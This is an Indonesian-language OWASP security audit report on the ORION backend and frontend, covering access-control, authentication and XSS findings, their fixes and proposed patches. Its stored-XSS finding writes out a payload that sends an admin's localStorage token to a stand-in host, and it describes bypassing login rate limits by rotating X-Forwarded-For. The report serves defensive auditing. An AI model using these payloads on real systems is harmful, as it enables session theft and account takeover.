# Laporan Audit Keamanan OWASP Top 10:2025 — ORION (KSM AIoT)

**Tanggal:** 29 September 2026  
**Cakupan:** `orion-backend` (FastAPI 0.141 / Python 3.14 / PostgreSQL, asyncpg, SQLAlchemy raw SQL) dan `orion-frontend` (Vite 6 MPA, vanilla JS, nginx)  
**Branch:** `security/owasp-2025-audit` di kedua repo (basis: `main`)  
**Metode:** membaca seluruh kode backend (routes, services, utils, schemas, models, config, migrasi, Dockerfile, entrypoint), JS/HTML/nginx/Vite frontend, riwayat git kedua repo; test lokal terhadap PostgreSQL sementara (pgserver) — tidak ada layanan produksi yang disentuh.

---

## 1. Ringkasan eksekutif

- **Skor risiko** (Kritis=10, Tinggi=5, Sedang=2, Rendah=1; temuan yang masih terbuka, termasuk yang baru diperbaiki sebagian): **sebelum 77 → sesudah 19**.
- **27 temuan keamanan:** 2 Kritis, 4 Tinggi, 16 Sedang, 5 Rendah.
  - **15 diperbaiki penuh**, termasuk seluruh Kritis dan Tinggi.
  - 2 diperbaiki sebagian (A02-03, A03-01).
  - 9 belum diperbaiki (6 Sedang, 3 Rendah; alasan dan patch usulan di bagian 4).
  - 1 diterima sebagai risiko sangat rendah (A01-05).
- Selain itu ada 10 bug fungsional yang diperbaiki (Lampiran B).
- **3 risiko teratas (sebelum perbaikan):**
  1. **A01-01:** staf PSDM (pengelola anggota) bisa memberi dirinya sendiri atau orang lain akses SUPERADMIN.
  2. **A07-01:** semua akun hasil impor Excel memakai satu password yang tercantum di repo publik, di README (berpasangan dengan NIM Ketua), dan di bundle JS frontend. Impor juga otomatis menjadikan setiap "Ketua" superadmin.
  3. **A07-02 + A07-03:** refresh token 7 hari diterima sebagai access token, dan rate limit login bisa dilewati hanya dengan memutar header `X-Forwarded-For`.
- **Tindakan manual yang wajib dilakukan:** reset password semua akun yang dibuat lewat impor Excel, rotasi secret di bagian 7, dan set `JWT_SECRET` serta `TRUSTED_PROXY_HOPS` di production (lihat 4 dan 5).

---

## 2. Daftar temuan

Keparahan mempertimbangkan dampak × kemudahan eksploitasi untuk aplikasi internal organisasi mahasiswa yang menyimpan data pribadi (UU PDP).
Semua temuan di bawah **Terkonfirmasi** dengan membaca kode, kecuali yang ditandai *Perlu konfirmasi*.
Commit dicantumkan per repo (`be` = orion-backend, `fe` = orion-frontend).

### Kritis

**A01-01 — Eskalasi hak akses ke SUPERADMIN oleh pengelola anggota** · A01 Broken Access Control  
- **Lokasi:** `orion-backend/services/member_service.py:460-473` (`grant_erp_access`), `:314` (`create_member`), `:564` (`reset_erp_password`); `routes/member_routes.py` (`/members/{id}/access`, `/password`, PUT `/members/{id}`)
- **Keparahan:** Kritis. Pelakunya cukup user yang sah dengan hak rendah (divisi PSDM mana pun), dan hasilnya kendali penuh atas sistem.
- **Skenario:** Staf PSDM login lalu mengirim `POST /members/<NIM-nya-sendiri>/access` dengan body `{"role":"SUPERADMIN","password":...}`. Kode lama langsung menyetel `is_superadmin = erp_role == "SUPERADMIN"` tanpa memeriksa siapa pelakunya. Ada juga cara lain: reset password akun superadmin, lalu login sebagai superadmin itu. Cara ketiga: `PUT /members/<diri-sendiri>` dengan `{"role":"Ketua"}`.
- **Bukti:** `tests/test_security_access_control.py`. Seluruh jalur di atas sekarang menghasilkan 403, sedangkan operasi normal tetap 200.
- **Dampak:** pengambilalihan semua data anggota, pendaftar, dan log audit.
- **Status:** Diperbaiki (`be` be33247). Hanya superadmin yang boleh memberi SUPERADMIN atau mengubah akun superadmin. Tidak ada yang bisa mengubah akses ERP atau jabatan/divisi/status dirinya sendiri. Nilai `erp_role` dibatasi ke PENGURUS | SUPERADMIN.

**A07-01 — Password default bersama untuk akun impor dan auto-superadmin** · A07 Authentication Failures (juga A02, A04)  
- **Lokasi:**
  - `orion-backend/utils/excel_importer.py:165` (password default di-hardcode) dan `:284` (`is_super = "Ketua" in role`)
  - `orion-backend/README.md:111-114` (NIM Ketua bersama password tersebut)
  - `orion-frontend/src/modules/auth.js:248` (fallback login offline memakai NIM dan password yang sama, lalu membuat sesi SUPERADMIN palsu)
- **Keparahan:** Kritis. Kredensialnya publik (repo GitHub dan bundle JS yang di-deploy), dan setiap akun impor langsung aktif.
- **Skenario:** Penyerang membaca README atau bundle JS, lalu login dengan NIM anggota mana pun ditambah password default. Jika NIM itu milik "Ketua", akunnya sekaligus `is_superadmin=true`. Selain itu, pengelola anggota bisa mengunggah spreadsheet yang mencantumkan dirinya sebagai "Ketua" untuk menjadi superadmin.
- **Bukti:** `tests/test_excel_import_security.py`
- **Dampak:** pengambilalihan akun massal, sampai tingkat superadmin.
- **Status:** Diperbaiki (`be` 2e14237, d9f80c1 untuk README, 5dd9b63; `fe` 0eca7a2). Password awal diambil dari `IMPORT_DEFAULT_PASSWORD`. Jika tidak diset, dipakai password acak yang tidak bisa dipakai login sampai admin me-reset. Impor tidak pernah memberi superadmin, dan fallback login offline dihapus. **Akun yang sudah terlanjur dibuat dengan password lama tetap rentan sampai di-reset manual (bagian 7).**

### Tinggi

**A07-02 — Refresh token diterima sebagai access token** · A07  
- **Lokasi:** `orion-backend/utils/security.py:46-52`. `decode_access_token` tidak memeriksa `type`.
- **Keparahan:** Tinggi. Batas umur access token 30 menit jadi tidak berarti: token 7 hari berfungsi sebagai bearer token di semua endpoint.
- **Bukti:** `tests/test_token_security.py`. Test gagal pada kode lama (3 kasus) dan lulus setelah perbaikan.
- **Status:** Diperbaiki (`be` 0520668). Access token wajib punya `type=access`, dan kedua jenis token wajib memuat `exp` dan `sub`.

**A07-03 — `X-Forwarded-For` dari klien dipercaya untuk rate limit dan audit** · A07 / A09  
- **Lokasi:** `orion-backend/utils/rate_limiter.py:69`, `routes/auth_routes.py:35,96`, `routes/registration_routes.py:142`
- **Keparahan:** Tinggi.
- **Skenario:**
  - Brute force login: setiap percobaan memakai `X-Forwarded-For` yang berbeda, sehingga batas 5 percobaan per menit tidak pernah tercapai. Rate limit upload dan pendaftaran bisa dilewati dengan cara yang sama.
  - Nilai header yang lebih panjang dari 45 karakter (`audit_logs.ip_address VARCHAR(45)`) membuat insert audit gagal tanpa suara, sehingga login gagal tidak tercatat.
- **Bukti:** `tests/test_client_ip.py::test_login_rate_limit_not_bypassed_by_rotating_forwarded_for`
- **Status:** Diperbaiki (`be` 9fe75b6). `utils/client_ip.py` mengambil entri ke-N dari kanan sesuai `TRUSTED_PROXY_HOPS` (default 1), memvalidasinya sebagai alamat IP, dan jika tidak valid memakai alamat socket. Rate limiter kini juga memangkas key yang sudah tidak aktif.

**A05-01 — Stored XSS lewat impor Excel dan link `javascript:`** · A05 Injection  
- **Lokasi:**
  - `orion-backend/utils/excel_importer.py`: tidak ada sanitasi, padahal semua jalur tulis lain melakukan HTML-escape.
  - `orion-frontend/src/scripts/members.js:436,547`: `href="${m.portfolio_url}"` dan field anggota dirender dengan `innerHTML`.
- **Keparahan:** Tinggi. Sumber datanya adalah jawaban Google Form (pihak luar), sedangkan yang terkena adalah admin yang token-nya tersimpan di localStorage.
- **Skenario:** Responden form mengisi nama `<img src=x onerror=...>` atau portofolio `javascript:fetch('//x?'+localStorage.aiot_auth_token)`. Setelah data diimpor, admin membuka halaman anggota dan token-nya dicuri.
- **Bukti:** `tests/test_excel_import_security.py::test_import_escapes_html_and_drops_script_links`, `tests/test_input_validation.py`
- **Status:** Diperbaiki (`be` 7836b56; `fe` c20d902). Baris impor kini disanitasi. `portfolio_url` hanya menerima http(s) atau URL tanpa skema, baik di schema maupun importer. `safeLinkUrl()` di frontend melindungi data lama yang sudah tersimpan.

**A02-01 — Konfigurasi production fail-open** · A02 Security Misconfiguration / A04  
- **Lokasi:** `orion-backend/config/config.py`
  - `:74`: `DEBUG` default `True`. Akibatnya teks exception dan SQL dikembalikan ke klien, dan seeder ikut berjalan.
  - `:50,137`: secret JWT default ada di repo publik, dan di production hanya memunculkan peringatan.
  - `JWT_ALGORITHM` bisa diisi `none` lewat env.
- **Keparahan:** Tinggi. Jika production memakai secret default, siapa pun bisa memalsukan JWT superadmin.
- **Bukti:** `tests/test_config_security.py`
- **Status:** Diperbaiki (`be` d9f80c1).
  - `DEBUG` default `False` dan dipaksa off di production.
  - Production menolak start jika memakai secret default atau secret kurang dari 32 karakter.
  - Algoritma JWT dibatasi ke HS256/384/512.

### Sedang

| ID | Kategori | Lokasi (baseline) | Masalah & skenario | Status / commit |
|---|---|---|---|---|
| A01-02 | A01 | `utils/auth_deps.py:100` | `require_pengurus` hanya menolak role "anggota" atau kosong, jadi role lain yang tidak dikenal (mis. `SystemRole.MEMBER`, typo di `users.role`) dianggap pengurus. | Diperbaiki (be 479551c), sekarang memakai allow-list. |
| A01-03 | A01 | `services/registration_service.py:90-91`, `member_service`, `auth_service` | Path file dari klien langsung disimpan. Pendaftar bisa menaruh path CV/foto milik orang lain. Saat registrasinya dihapus, file korban ikut terhapus. | Diperbaiki (be 3cfdd91). Server hanya menerima path staging `tmp/` yang ia keluarkan sendiri. |
| A06-02 | A06 | `services/storage_service.py:126,219` | Endpoint upload publik menulis langsung ke storage permanen, sehingga file yang tidak pernah disimpan menumpuk tanpa batas (disk-fill; rate limit bisa dilewati via A07-03). | Diperbaiki (be 3cfdd91). File di-staging, dipindah saat submit, dan dibersihkan otomatis setelah 24 jam. |
| A06-01 | A06 / A08 / A10 | `routes/member_routes.py:183,190` | Upload Excel dibaca ke memori tanpa batas ukuran. Error dikembalikan sebagai 500 berisi teks exception internal. openpyxl berjalan tanpa `defusedxml`. | Diperbaiki (be 87819e8, fe d680584). Maksimal 5MB, pesan error generik, `defusedxml` ditambahkan. |
| A07-04 | A07 / A10 | `schemas/auth.py:31`, `schemas/member.py:125,130` | Tidak ada kebijakan password di server (frontend: 6 atau 8 karakter). Password lebih dari 72 byte membuat bcrypt 5 error, jadi 500. Email profil tanpa validasi, dan email duplikat juga menghasilkan 500. | Diperbaiki (be 21c2ff3, fe a4d67a8). |
| A09-01 | A09 / A10 | `services/audit_log_service.py:96` | Kegagalan tulis audit ditelan tanpa rollback, sehingga session rusak dan operasi utama berikutnya ikut 500. | Diperbaiki (be 64fd091). |
| A10-01 | A10 / A06 | `routes/registration_routes.py:139`, `schemas/registration.py:69` | `except Exception: pass` pada pengecekan deadline membuat pendaftaran tetap diterima meski deadline sudah lewat (fail-open). Status, deadline, dan kuota intake tidak divalidasi. Deadline dibandingkan dalam UTC, bukan WIB. | Diperbaiki (be 8664abb). |
| A04-01 | A04 / A02 | `routes/upload_routes.py:142` | CV (data pribadi) dikirim dengan `Cache-Control: public, max-age=86400`, sehingga bisa tersimpan di CDN atau cache bersama. | Diperbaiki (be d004823). Sekarang `private, no-store` dan `noindex`. |
| A02-02 | A02 / A03 | `Dockerfile:14,48`, `.dockerignore` | Container berjalan sebagai root. uv diinstal lewat `curl … \| sh` tanpa pin versi. `uploads/` (foto dan CV) ikut masuk ke image. | Diperbaiki (be d50e3f2). Hak akses diturunkan lewat `setpriv`, uv di-pin, `uploads/` dikecualikan. |
| A02-03 | A02 | `orion-frontend/nginx.conf` | Frontend tidak mengirim header keamanan dan tidak punya CSP. | **Sebagian.** Header nosniff/XFO/Referrer/Permissions ditambahkan (fe a765c02). CSP belum (lihat bagian 4). |
| A07-05 | A07 | `routes/auth_routes.py` (logout), `auth_service.change_password` | JWT tidak bisa dicabut. Logout dan ganti password tidak membatalkan access token (30 menit) atau refresh token (7 hari). Penonaktifan akun sudah langsung berlaku karena `is_active` dicek. | Belum (butuh perubahan skema). |
| A07-06 | A07 | `orion-frontend/src/modules/auth.js:138,208` | Access dan refresh token disimpan di `localStorage`, sehingga XSS apa pun berujung pencurian token. | Belum (mengubah kontrak auth). |
| A08-01 | A08 | `orion-frontend/pages/archive.html:19` | `html2pdf.js` dimuat dari cdnjs tanpa `integrity` (SRI) di halaman CRM yang punya akses ke token. | Belum (hash harus diambil dari sumber tepercaya). |
| A09-03 | A09 | `models/audit_log_model.py:14`, `migrations/` | Docstring menyebut "database-level triggers prevent UPDATE and DELETE", tetapi trigger itu tidak ada, jadi log audit bisa diubah atau dihapus. | Belum (butuh migrasi DB). |
| A01-04 | A01 | `routes/registration_routes.py` (approve), `can_manage_selection` | *Perlu konfirmasi.* PSDM bisa meng-approve kandidat langsung dengan `role="Ketua"`. Jabatan itu memberi akses keuangan dan arsip, dan bisa disalahgunakan bersama orang dalam. | Belum (aturan bisnis). |
| A06-03 | A06 | `routes/registration_routes.py` (submit) | *Perlu konfirmasi.* Kuota intake disimpan dan ditampilkan, tetapi tidak pernah ditegakkan. | Belum (aturan bisnis). |

### Rendah

| ID | Kategori | Lokasi | Masalah | Status |
|---|---|---|---|---|
| A03-01 | A03 | `orion-frontend/Dockerfile:7`, base image | `pnpm@latest`, dan base image (`python:3.14-slim`, `node:22-alpine`, `nginx:alpine`) memakai tag, bukan digest. | Sebagian: pnpm di-pin (fe 455a62a). Pin digest belum. |
| A09-02 | A09 | `services/auth_service.py:82` | Log login gagal menyimpan identifier mentah, yang bisa berisi password jika user salah ketik di kolom NIM. | Belum. |
| A02-04 | A02 | `config/config.py` (CORS) | Regex `*.trycloudflare.com` dengan `allow_credentials` aktif setiap kali `ENVIRONMENT` bukan `production`, padahal default-nya `development`. Siapa pun bisa membuat tunnel trycloudflare. | Belum. |
| A02-05 | A02 | `orion-frontend/vite.config.js` | `server.allowedHosts: true` (hanya dev server) membuka risiko DNS rebinding pada mesin developer. | Belum. |
| A01-05 | A01 | `main.py` (`/health/db`) | Endpoint cek DB bersifat publik (info minimal: `SELECT 1`). | Diterima (risiko sangat rendah). |

### Temuan yang diverifikasi sebagai false positive

- **Bandit B608** (`auth_service` UPDATE users, `member_service` UPDATE members, `registration_service` bulk delete): klausa dibangun dari fragmen konstan atau nama field schema Pydantic, dan semua nilai memakai bind parameter. Tidak ada SQL injection. Diberi anotasi `nosec` beserta alasannya (be 3e202ae).
- **Bandit B105/B106 `'bearer'`**: nama token type, bukan password. **B108**: path URL `/tmp/...`, bukan filesystem.

---

## 3. Matriks cakupan A01–A10

| Kategori | Status | Yang diperiksa |
|---|---|---|
| A01 Broken Access Control | Ada temuan (A01-01..05) | Semua dependency RBAC, tiap endpoint (auth/tanpa auth), IDOR identifier anggota/registrasi, mass assignment (`MemberUpdate`, ERP flags), path traversal upload/serve (aman: `Path.name` + `relative_to`), CORS, open redirect (tidak ada redirect berbasis input selain legacy redirect ke path konstan), SSRF (tidak ada fetch server-side), cek role hanya di frontend (ada: pembatasan SUPERADMIN di UI members). Tidak multi-tenant. |
| A02 Security Misconfiguration | Ada temuan (A02-01..05) | DEBUG, default credential/secret, header keamanan API (ada) & frontend (tidak ada), cookie (tidak dipakai), directory listing nginx (off), container root, error verbose, CORS. |
| A03 Supply Chain | Ada temuan (A03-01, A02-02) | `pip-audit` (0 CVE), `pnpm audit` (0), lockfile ada (`uv.lock`, `pnpm-lock.yaml`), `curl \| sh`, `pnpm@latest`, tag base image. Tidak ada CI/CD di repo. |
| A04 Cryptographic Failures | Ada temuan (A02-01, A04-01) | bcrypt cost 12 (baik), PyJWT dengan daftar algoritma eksplisit, `alg:none` ditolak (test), secret default, token acak (`secrets`/uuid4), TLS (di luar kode, lihat bagian 5), caching data pribadi. |
| A05 Injection | Ada temuan (A05-01) | Semua query SQL (raw `text()` dengan bind param, tidak ada injection), XSS: 58 sink `innerHTML` di frontend dengan model escape-on-input di backend (celah: importer + skema `href`), template Jinja (hanya landing page, konteks dari settings), command injection (tidak ada), formula injection CSV/Excel (tidak ada ekspor spreadsheet dari data user; ekspor log JSON). |
| A06 Insecure Design | Ada temuan (A06-01..03) | Rate limit, batas ukuran upload/impor, kuota intake, alur approve, penumpukan file, race pada member ID (unik + max-per-tahun; sisa race sangat kecil). |
| A07 Authentication Failures | Ada temuan (A07-01..06) | Brute force & rate limit, kebijakan password, pesan error login (seragam, tidak bocor akun), sesi/logout, tipe token, penyimpanan token, kredensial ter-hardcode. |
| A08 Integrity Failures | Ada temuan (A08-01, A06-01 XML) | Deserialisasi (tidak ada pickle/yaml; JSON saja), SRI CDN, XML parsing openpyxl, webhook (tidak ada), CI/CD (tidak ada). |
| A09 Logging & Alerting | Ada temuan (A09-01..03, A07-03) | Audit untuk login sukses/gagal, logout, aksi admin (ada); kegagalan tulis audit; IP spoofing; immutability log; data sensitif di log; monitoring/alert (tidak ada di kode, lihat bagian 5). |
| A10 Exceptional Conditions | Ada temuan (A10-01, A09-01, A07-04, A06-01) | `except` kosong/lebar, fail-open validasi, stack trace ke user (handler global sudah generik bila DEBUG off), rollback transaksi, input ekstrem (password >72 byte, email duplikat, file besar, `%3F` di path, kasus B-04). |

---

## 4. Temuan yang belum diperbaiki dan patch usulan

**A07-05: pencabutan token.** Perlu kolom baru, jadi tidak diterapkan karena aturan "jangan ubah skema".
```python
# migrasi: ALTER TABLE users ADD COLUMN token_version INTEGER NOT NULL DEFAULT 0;
# create_access_token / create_refresh_token: data["ver"] = user["token_version"]
# get_current_user & refresh_tokens:
if payload.get("ver") != user["token_version"]:
    raise HTTPException(401, "Sesi sudah tidak berlaku.")
# logout, change_password, reset_erp_password, revoke_erp_access:
await session.execute(text("UPDATE users SET token_version = token_version + 1 WHERE id = :id"), {"id": user_id})
```

**A07-06: token di localStorage.** Tidak diterapkan karena mengubah kontrak login untuk klien. Usulan:
- Simpan refresh token di cookie `HttpOnly; Secure; SameSite=Strict; Path=/orion/api/v1/auth/refresh`.
- Simpan access token hanya di memori.
- Tambahkan proteksi CSRF (header kustom atau double-submit) pada `/auth/refresh`.

**A08-01: SRI untuk html2pdf.** Mengambil hash butuh mengunduh file dari CDN, dan itu tidak saya lakukan tanpa izin. Ada dua pilihan:
- Tambahkan atribut dari halaman cdnjs:
  ```html
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"
          integrity="sha512-<hash dari cdnjs>" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  ```
- Lebih baik lagi: `pnpm add html2pdf.js@0.10.1` lalu `import html2pdf from 'html2pdf.js'` di `archive.js`, sehingga ter-bundle dan terkunci lockfile.

**A02-03: CSP frontend.** Tidak diterapkan karena ada handler inline (`onclick="window.openEditMember(...)"` di `members.js`) dan CSP ketat akan merusak UI. Usulan: pasang dulu sebagai Report-Only di `nginx.conf`, lalu hilangkan handler inline secara bertahap.
```nginx
add_header Content-Security-Policy-Report-Only "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: blob: https:; connect-src 'self' https://<domain-api>; object-src 'none'; base-uri 'self'; frame-ancestors 'none'" always;
```

**A09-03: log audit append-only.** Butuh migrasi DB, dan test/`scripts/cleanup_test_noise.py` saat ini menghapus baris audit.
```sql
CREATE OR REPLACE FUNCTION audit_logs_immutable() RETURNS trigger AS $$
BEGIN RAISE EXCEPTION 'audit_logs is append-only'; END; $$ LANGUAGE plpgsql;
CREATE TRIGGER trg_audit_logs_immutable BEFORE UPDATE OR DELETE ON audit_logs
FOR EACH ROW EXECUTE FUNCTION audit_logs_immutable();
```
Sebagai alternatif, gunakan role DB aplikasi yang hanya punya hak `INSERT`/`SELECT` pada `audit_logs`.

**A01-04: role saat approve** *(perlu konfirmasi).* Jika aturannya "hanya Ketua/superadmin yang boleh menetapkan jabatan BPH", tambahkan di `approve_registration`:
```python
if role in {"Ketua", "Wakil Ketua", "Sekretaris", "Bendahara"} and not (is_superadmin_user(actor) or actor["role"] == "Ketua"):
    raise HTTPException(403, "Penetapan jabatan BPH hanya oleh Ketua/Superadmin.")
```

**A06-03: kuota** *(perlu konfirmasi).* Di `submit_registration`, hitung `SELECT COUNT(*) FROM registrations WHERE intake_period = :p AND status <> 'Rejected'` lalu tolak dengan 403 jika sudah `>= quota`.

**Rendah (ringkas):**
- **A03-01:** pin base image dengan `@sha256:<digest>`.
- **A09-02:** simpan identifier hanya jika cocok dengan pola NIM atau email; jika tidak, simpan `"<tidak valid>"`.
- **A02-04:** default `ENVIRONMENT=production`, atau aktifkan regex trycloudflare hanya bila `CORS_ORIGIN_REGEX` diset eksplisit.
- **A02-05:** ganti `allowedHosts: true` dengan daftar host yang eksplisit.

---

## 5. Hal yang tidak bisa diperiksa dari kode (perlu verifikasi manual)

- **Variabel environment production:**
  - `ENVIRONMENT=production`
  - `JWT_SECRET` acak ≥32 karakter; aplikasi kini menolak start tanpanya
  - `DEBUG`
  - `TRUSTED_PROXY_HOPS` sesuai topologi. Default 1 cocok untuk cloudflared/nginx di depan API. Jika API diekspos langsung tanpa proxy, set `0`.
  - `CORS_ORIGINS`
- **Deployment:** konfigurasi Cloudflare Tunnel/WAF, terminasi TLS dan HSTS di edge, apakah port 8000 atau PostgreSQL terekspos ke internet, hak akses user DB aplikasi, backup dan enkripsi volume `uploads/` serta database.
- **`nginx.conf` belum diuji dengan nginx sungguhan** (tidak ada nginx maupun Docker di mesin audit). Logika routing yang sama sudah diuji di server preview Vite. Uji `nginx -t` dan cek URL seperti di bagian 6.
- **Dockerfile belum di-build** (Docker daemon tidak tersedia). Pastikan `ghcr.io/astral-sh/uv:0.9.21` bisa di-pull dan `setpriv` tersedia di image (util-linux, paket esensial Debian).
- **Data production:**
  - Akun mana saja yang masih memakai password default impor.
  - Nilai `users.role` yang tidak termasuk allow-list A01-02. Setelah deploy, cek dengan `SELECT DISTINCT role FROM users`. Role pengurus yang sah tapi tidak dikenali kini akan ditolak 403.
  - Apakah secret JWT default pernah dipakai.
- **Monitoring dan alert:** kode hanya mencatat log, tidak ada alerting.
- **Tool yang tidak tersedia:** semgrep, gitleaks, dan trivy tidak terpasang. Pemindaian secret di riwayat git dilakukan manual (grep pola secret di `git log -p` kedua repo, nilai disamarkan).

---

## 6. Hasil test dan pemindaian: sebelum vs sesudah

| Pemeriksaan | Sebelum (`main`) | Sesudah (branch) |
|---|---|---|
| pytest backend (PostgreSQL lokal) | 24 test: **23 lulus, 1 gagal** (`test_auth_login_superadmin`, bug B-01) | **120 test, 120 lulus** (96 test baru: regresi keamanan, redirect URL lama, lifecycle upload) |
| ruff | 8 temuan | 2 (keduanya sudah ada sebelumnya: `BLE001` di `models/system_setting_model.py`, `tests/conftest.py`) |
| bandit | 6 (3 Low, 3 Medium) | 0 (semua sisa sudah diverifikasi sebagai false positive dan dianotasi) |
| pip-audit (`uv.lock`, non-dev) | 0 kerentanan diketahui | 0 kerentanan diketahui (+`defusedxml` 0.7.1) |
| pnpm audit | 0 | 0 |
| Build frontend (`vite build`) | Berhasil | Berhasil |
| Smoke test browser (preview + API lokal) | – | Login, seleksi, anggota, log, dan profil memanggil endpoint baru dengan status 200. URL halaman lama di-redirect 301. |

**Catatan metode:** pemindaian dependensi mengirim daftar nama dan versi paket (informasi publik) ke PyPI/OSV dan registry npm. Tidak ada data aplikasi yang dikirim.

**Langkah uji manual setelah deploy:**
1. Login sebagai staf PSDM, lalu coba beri akses ERP role SUPERADMIN ke anggota lain dan ke diri sendiri. Keduanya harus 403. Beri akses PENGURUS harus 200.
2. Coba login akun hasil impor dengan password default lama. Harus 401 (setelah password akun itu di-reset).
3. Pakai `refresh_token` sebagai header `Authorization: Bearer` ke `GET /auth/me`. Harus 401.
4. Enam kali login salah dengan `X-Forwarded-For` berbeda. Percobaan keenam harus 429.
5. Isi portofolio `javascript:alert(1)` di form pendaftaran. Harus ditolak (422).
6. Upload foto lalu tutup form tanpa submit. Setelah 24 jam, file di `uploads/tmp/avatars/` harus sudah hilang.
7. Buka `/orion/pages/members.html`. Harus 301 ke `/orion/members`.
8. `GET /orion/api/v1/members/count` harus 301 ke `/members/stats`.
9. Start backend dengan `ENVIRONMENT=production` tanpa `JWT_SECRET`. Aplikasi harus menolak start.

---

## 7. Secret yang perlu dirotasi (lokasi saja)

1. **Password awal akun hasil impor Excel.**
   - Lokasi: `orion-backend/utils/excel_importer.py` (riwayat `main`), `orion-backend/README.md` bagian "Akun Uji Coba" (riwayat, berpasangan dengan NIM Ketua), `orion-frontend/src/modules/auth.js` fallback login (riwayat), serta **bundle JS yang sudah ter-deploy**.
   - Tindakan: reset password semua akun yang dibuat lewat impor, dimulai dari NIM yang tercantum di README. Gunakan `PUT /members/{id}/password` atau password acak lalu distribusikan.
2. **Password superadmin lama.** Pernah di-hardcode di `orion-backend/utils/seed.py` (riwayat git sebelum commit `aafd611`). Rotasi `SUPERADMIN_PW` jika nilainya masih sama.
3. **Secret JWT default.** `orion-backend/config/config.py` (default dev, publik). Jika production pernah memakainya, ganti `JWT_SECRET`. Konsekuensinya semua sesi akan logout.
4. **Password DB default dev.** `orion-backend/config/config.py`, `entrypoint.sh`, `README.md`. Rotasi jika pernah dipakai di luar mesin lokal.

Riwayat git publik tidak bisa "dihapus" secara efektif karena salinan sudah ada di clone dan fork. Karena itu tindakannya adalah **rotasi**, bukan penulisan ulang riwayat.

---

## Lampiran A — Refactor URL (Tahap A)

| Lama | Baru | Kompatibilitas |
|---|---|---|
| `GET/POST /members/`, `/registrations/`, `GET /audit-logs/` | tanpa trailing slash | 301 (GET) / 308 |
| `GET /members/count` | `GET /members/stats` | 301 |
| `GET /members/public/organization` | `GET /members/public` | 301 |
| `POST /members/import-excel` | `POST /members/imports` | 308 |
| `POST /members/{id}/reset-password` | `PUT /members/{id}/password` | 308 (POST pada URL baru tetap diterima sebagai target redirect) |
| `POST /auth/change-password` | `PUT /auth/me/password` | 308 (idem) |
| `POST /uploads/avatar`, `/uploads/cv` | `POST /uploads/avatars`, `/uploads/cvs` | 308 |
| `GET /avatars/{f}`, `GET /cvs/{f}` (alias duplikat) | `GET /uploads/avatars/{f}`, `/uploads/cvs/{f}` | 301 |
| `GET /db-test` | `GET /health/db` | 301 |
| Halaman `/orion/pages/<nama>[.html][/]`, `/orion/<nama>/` | `/orion/<nama>` | 301 (nginx dan server Vite) |
| *Dipertahankan:* `PATCH /registrations/{id}/approve\|reject`, `POST /members/{id}/anonymize` | — | Transisi status (pengecualian yang wajar) |
| *Dipertahankan:* `POST /registrations/bulk-delete` | — | `DELETE` dengan body tidak andal di semua proxy (opsi paling aman) |

Semua redirect didefinisikan di `orion-backend/routes/legacy_routes.py` dan diuji di `tests/test_legacy_urls.py`. Frontend memakai satu modul, `src/modules/api.js`, sebagai sumber tunggal untuk URL API dan halaman.

## Lampiran B — Bug non-keamanan yang diperbaiki (Tahap B)

| ID | Lokasi | Bug | Commit |
|---|---|---|---|
| B-01 | `utils/seed.py:20` | Superadmin hasil seed memiliki `is_superadmin=false` (satu-satunya test yang gagal di baseline) | be ecf98b5 |
| B-02 | `services/registration_service.py:169,185` | Member ID dihitung dari `COUNT(*)+1` lintas tahun: bisa bentrok setelah ada penghapusan (500), dan approve NIM yang sudah jadi anggota menghasilkan ID yang tidak cocok | be 0ec8ae4 |
| B-03 | `services/registration_service.py:324,326` | File dihapus sebelum commit DB | be 9c33b29 |
| B-04 | `main.py:93` | Middleware prefix tidak menyinkronkan `raw_path`; `%3F` di path terbaca sebagai query; prefix dicocokkan tanpa batas segmen | be 1f5fab5 |
| B-05 | `services/member_service.py:182` | `erp_password` di-HTML-escape sebelum di-hash, sehingga password dengan `& < > "` tidak bisa dipakai login | be be33247 |
| B-06 | `orion-frontend/nginx.conf:15,20` | Aturan regex halaman tidak pernah berjalan karena berada di belakang `location ^~ /orion/` | fe a765c02 |
| B-07 | `routes/member_routes.py` | `.xls` diterima padahal openpyxl tidak bisa membacanya | be 87819e8 |
| B-08 | `routes/registration_routes.py:132` | Deadline dibandingkan dalam UTC (pendaftaran tetap terbuka sampai 07:00 WIB esok harinya) | be 8664abb |
| B-09 | `services/storage_service.py` | File upload menumpuk (setiap unggahan disimpan permanen) | be 3cfdd91 |
| B-10 | `services/auth_service.py` | Email profil duplikat menghasilkan `IntegrityError` (500) | be 21c2ff3 |
